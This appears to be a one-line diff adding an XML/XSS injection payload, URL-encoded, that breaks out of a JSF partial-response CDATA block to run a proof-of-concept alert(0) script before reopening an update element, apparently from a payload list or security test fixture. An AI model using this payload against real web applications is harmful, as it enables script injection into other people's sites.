@@ -1,0 +1,1 @@
+]]></update><something%3ascript+xmlns%3asomething%3d"http%3a//www.w3.org/1999/xhtml">alert(0)</something%3ascript><update+id%3d"j_id1%3ajavax.faces.ClientWindow%3a0"><![CDATA[
